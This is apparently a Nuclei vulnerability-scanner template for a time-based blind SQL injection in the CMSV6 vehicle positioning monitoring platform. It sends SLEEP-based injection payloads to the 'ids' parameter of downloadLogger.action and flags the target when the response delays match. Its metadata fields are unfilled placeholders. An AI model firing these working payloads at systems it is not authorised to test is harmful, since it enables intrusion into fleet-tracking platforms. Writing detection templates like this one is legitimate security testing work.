id: CMSV6-downloadLogger-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 通天星CMSV6车载定位监控平台 disable SQL注入
  reference:
    - https://
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids=1%20AND%20(SELECT%202688%20FROM%20(SELECT(SLEEP(3)))a)"
      - "{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids=1%20AND%20(SELECT%202688%20FROM%20(SELECT(SLEEP(6)))a)"
      - "{{BaseURL}}/edu_security_officer/disable;downloadLogger.action?ids=1%20AND%20(SELECT%202688%20FROM%20(SELECT(SLEEP(9)))a)"
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"